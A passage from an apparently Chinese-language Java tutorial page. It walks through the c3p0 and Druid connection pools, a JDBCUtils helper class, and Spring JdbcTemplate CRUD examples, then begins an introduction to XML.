mchange-commons-java-0.2.12.jar ，<ul><li>不要忘记导入数据库驱动jar包</li></ul></li><li>定义配置文件：<ul><li>名称： c3p0.properties 或者 c3p0-config.xml</li><li>路径：直接将文件放在src目录下即可。</li></ul></li><li>创建核心对象 数据库连接池对象 ComboPooledDataSource</li><li>获取连接： getConnection</li></ol></li><li>代码：<br>   //1.创建数据库连接池对象<br>   DataSource ds  = new ComboPooledDataSource();<br>   //2. 获取连接对象<br>   Connection conn = ds.getConnection();</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.datasource.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.ComboPooledDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * c3p0演示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C3P0Demo2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="comment">/* //1. 获取DataSource，使用默认配置</span></span><br><span class="line"><span class="comment">        DataSource ds  = new ComboPooledDataSource();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        //2.获取连接</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        for (int i = 1; i &lt;= 11 ; i++) &#123;</span></span><br><span class="line"><span class="comment">            Connection conn = ds.getConnection();</span></span><br><span class="line"><span class="comment">            System.out.println(i+&quot;:&quot;+conn);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            if(i == 5)&#123;</span></span><br><span class="line"><span class="comment">                conn.close();//归还连接到连接池中</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//testNamedConfig();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testNamedConfig</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="comment">// 1.1 获取DataSource，使用指定名称配置</span></span><br><span class="line">        DataSource ds  = <span class="keyword">new</span> ComboPooledDataSource(<span class="string">&quot;otherc3p0&quot;</span>);</span><br><span class="line">        <span class="comment">//2.获取连接</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span> ; i++) &#123;</span><br><span class="line">            Connection conn = ds.getConnection();</span><br><span class="line">            System.out.println(i+<span class="string">&quot;:&quot;</span>+conn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Druid数据库连接池实现"><a href="#Druid数据库连接池实现" class="headerlink" title="Druid数据库连接池实现"></a>Druid数据库连接池实现</h4><blockquote><p>Druid：数据库连接池实现技术，由阿里巴巴提供的</p><ol><li>步骤：<ol><li>导入jar包 druid-1.0.9.jar</li><li>定义配置文件：<ul><li>是properties形式的</li><li>可以叫任意名称，可以放在任意目录下</li></ul></li><li>加载配置文件。Properties</li><li>获取数据库连接池对象：通过工厂来来获取  DruidDataSourceFactory</li><li>获取连接：getConnection</li></ol></li></ol><ul><li>代码：<br>   //3.加载配置文件<br>   Properties pro = new Properties();<br>   InputStream is = DruidDemo.class.getClassLoader().getResourceAsStream(“druid.properties”);<br>   pro.load(is);<br>   //4.获取连接池对象<br>   DataSource ds = DruidDataSourceFactory.createDataSource(pro);<br>   //5.获取连接<br>   Connection conn = ds.getConnection();</li></ul><ol start="2"><li>定义工具类<ol><li>定义一个类 JDBCUtils</li><li>提供静态代码块加载配置文件，初始化连接池对象</li><li>提供方法<ol><li>获取连接方法：通过数据库连接池获取连接</li><li>释放资源</li><li>获取连接池的方法</li></ol></li></ol></li></ol></blockquote><h5 id="数据库连接池工具类"><a href="#数据库连接池工具类" class="headerlink" title="数据库连接池工具类"></a>数据库连接池工具类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Druid连接池的工具类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JDBCUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.定义成员变量 DataSource</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DataSource ds ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.加载配置文件</span></span><br><span class="line">            Properties pro = <span class="keyword">new</span> Properties();</span><br><span class="line">            pro.load(JDBCUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;druid.properties&quot;</span>));</span><br><span class="line">            <span class="comment">//2.获取DataSource</span></span><br><span class="line">            ds = DruidDataSourceFactory.createDataSource(pro);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Statement stmt,Connection conn)</span></span>&#123;</span><br><span class="line">       <span class="comment">/* if(stmt != null)&#123;</span></span><br><span class="line"><span class="comment">            try &#123;</span></span><br><span class="line"><span class="comment">                stmt.close();</span></span><br><span class="line"><span class="comment">            &#125; catch (SQLException e) &#123;</span></span><br><span class="line"><span class="comment">                e.printStackTrace();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        if(conn != null)&#123;</span></span><br><span class="line"><span class="comment">            try &#123;</span></span><br><span class="line"><span class="comment">                conn.close();//归还连接</span></span><br><span class="line"><span class="comment">            &#125; catch (SQLException e) &#123;</span></span><br><span class="line"><span class="comment">                e.printStackTrace();</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line"></span><br><span class="line">       close(<span class="keyword">null</span>,stmt,conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(ResultSet rs , Statement stmt, Connection conn)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(rs != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(stmt != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                stmt.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                conn.close();<span class="comment">//归还连接</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取连接池方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DataSource <span class="title">getDataSource</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  ds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Spring-JDBC"><a href="#Spring-JDBC" class="headerlink" title="Spring JDBC"></a>Spring JDBC</h3><blockquote><p>Spring框架对JDBC的简单封装。提供了一个JDBCTemplate对象简化JDBC的开发</p><p>步骤：</p><ol><li><p>导入jar包</p></li><li><p>创建JdbcTemplate对象。依赖于数据源DataSource</p><ul><li>JdbcTemplate template = new JdbcTemplate(ds);</li></ul></li><li><p>调用JdbcTemplate的方法来完成CRUD的操作</p><ul><li>update():执行DML语句。增、删、改语句</li><li>queryForMap():查询结果将结果集封装为map集合，将列名作为key，将值作为value 将这条记录封装为一个map集合<ul><li>注意：这个方法查询的结果集长度只能是1</li></ul></li><li>queryForList():查询结果将结果集封装为list集合<ul><li>注意：将每一条记录封装为一个Map集合，再将Map集合装载到List集合中</li></ul></li><li>query():查询结果，将结果封装为JavaBean对象<ul><li>query的参数：RowMapper<ul><li>一般我们使用BeanPropertyRowMapper实现类。可以完成数据到JavaBean的自动封装</li><li>new BeanPropertyRowMapper&lt;类型&gt;(类型.class)</li></ul></li></ul></li><li>queryForObject：查询结果，将结果封装为对象<ul><li>一般用于聚合函数的查询</li></ul></li></ul></li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.jdbctemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.utils.JDBCUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JdbcTemplate入门</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcTemplateDemo1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.导入jar包</span></span><br><span class="line">        <span class="comment">//2.创建JDBCTemplate对象</span></span><br><span class="line">        JdbcTemplate template = <span class="keyword">new</span> JdbcTemplate(JDBCUtils.getDataSource());</span><br><span class="line">        <span class="comment">//3.调用方法</span></span><br><span class="line">        String sql = <span class="string">&quot;update account set balance = 5000 where id = ?&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> count = template.update(sql, <span class="number">3</span>);</span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.jdbctemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.domain.Emp;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.utils.JDBCUtils;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.BeanPropertyRowMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.RowMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Date;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JdbcTemplateDemo2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Junit单元测试，可以让方法独立执行</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1. 获取JDBCTemplate对象</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate template = <span class="keyword">new</span> JdbcTemplate(JDBCUtils.getDataSource());</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 1. 修改1号数据的 salary 为 10000</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 定义sql</span></span><br><span class="line">        String sql = <span class="string">&quot;update emp set salary = 10000 where id = 1001&quot;</span>;</span><br><span class="line">        <span class="comment">//3. 执行sql</span></span><br><span class="line">        <span class="keyword">int</span> count = template.update(sql);</span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 2. 添加一条记录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;insert into emp(id,ename,dept_id) values(?,?,?)&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> count = template.update(sql, <span class="number">1015</span>, <span class="string">&quot;郭靖&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        System.out.println(count);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 3.删除刚才添加的记录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;delete from emp where id = ?&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> count = template.update(sql, <span class="number">1015</span>);</span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 4.查询id为1001的记录，将其封装为Map集合</span></span><br><span class="line"><span class="comment">     * 注意：这个方法查询的结果集长度只能是1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;select * from emp where id = ? or id = ?&quot;</span>;</span><br><span class="line">        Map&lt;String, Object&gt; map = template.queryForMap(sql, <span class="number">1001</span>,<span class="number">1002</span>);</span><br><span class="line">        System.out.println(map);</span><br><span class="line">        <span class="comment">//&#123;id=1001, ename=孙悟空, job_id=4, mgr=1004, joindate=2000-12-17, salary=10000.00, bonus=null, dept_id=20&#125;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 5. 查询所有记录，将其封装为List</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;select * from emp&quot;</span>;</span><br><span class="line">        List&lt;Map&lt;String, Object&gt;&gt; list = template.queryForList(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map&lt;String, Object&gt; stringObjectMap : list) &#123;</span><br><span class="line">            System.out.println(stringObjectMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 6. 查询所有记录，将其封装为Emp对象的List集合</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;select * from emp&quot;</span>;</span><br><span class="line">        List&lt;Emp&gt; list = template.query(sql, <span class="keyword">new</span> RowMapper&lt;Emp&gt;() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Emp <span class="title">mapRow</span><span class="params">(ResultSet rs, <span class="keyword">int</span> i)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">                Emp emp = <span class="keyword">new</span> Emp();</span><br><span class="line">                <span class="keyword">int</span> id = rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                String ename = rs.getString(<span class="string">&quot;ename&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> job_id = rs.getInt(<span class="string">&quot;job_id&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> mgr = rs.getInt(<span class="string">&quot;mgr&quot;</span>);</span><br><span class="line">                Date joindate = rs.getDate(<span class="string">&quot;joindate&quot;</span>);</span><br><span class="line">                <span class="keyword">double</span> salary = rs.getDouble(<span class="string">&quot;salary&quot;</span>);</span><br><span class="line">                <span class="keyword">double</span> bonus = rs.getDouble(<span class="string">&quot;bonus&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> dept_id = rs.getInt(<span class="string">&quot;dept_id&quot;</span>);</span><br><span class="line"></span><br><span class="line">                emp.setId(id);</span><br><span class="line">                emp.setEname(ename);</span><br><span class="line">                emp.setJob_id(job_id);</span><br><span class="line">                emp.setMgr(mgr);</span><br><span class="line">                emp.setJoindate(joindate);</span><br><span class="line">                emp.setSalary(salary);</span><br><span class="line">                emp.setBonus(bonus);</span><br><span class="line">                emp.setDept_id(dept_id);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> emp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Emp emp : list) &#123;</span><br><span class="line">            System.out.println(emp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 6. 查询所有记录，将其封装为Emp对象的List集合</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test6_2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;select * from emp&quot;</span>;</span><br><span class="line">        List&lt;Emp&gt; list = template.query(sql, <span class="keyword">new</span> BeanPropertyRowMapper&lt;Emp&gt;(Emp.class));</span><br><span class="line">        <span class="keyword">for</span> (Emp emp : list) &#123;</span><br><span class="line">            System.out.println(emp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 7. 查询总记录数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test7</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String sql = <span class="string">&quot;select count(id) from emp&quot;</span>;</span><br><span class="line">        Long total = template.queryForObject(sql, Long.class);</span><br><span class="line">        System.out.println(total);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h3><blockquote><p>可拓展标记语言</p><p>标签自定义</p><p>功能：</p><ol><li>存储数据</li><li>作为配置文件</li><li>在网络中传输</li><li>跨平台</li></ol></blockquote><blockquote><p>概念：Extensible Markup Language 可扩展标记语言</p><ul><li><p>可扩展：标签都是自定义的。 <user>  <student></p></li><li><p>功能</p><ul><li>存储数据<ol><li>配置文件</li><li>在网络中传输</li></ol></li></ul></li><li><p>xml与html的区别</p><ol><li>xml标签都是自定义的，html标签是预定义。</li><li>xml的语法严格，html语法松散</li><li>xml是存储数据的，html是展示数据</li></ol></li><li><p>w3c:万维网联盟</p></li></ul><ol><li>语法：</li></ol><ul><li><p>基本语法：</p><ol><li>xml文档的后缀名 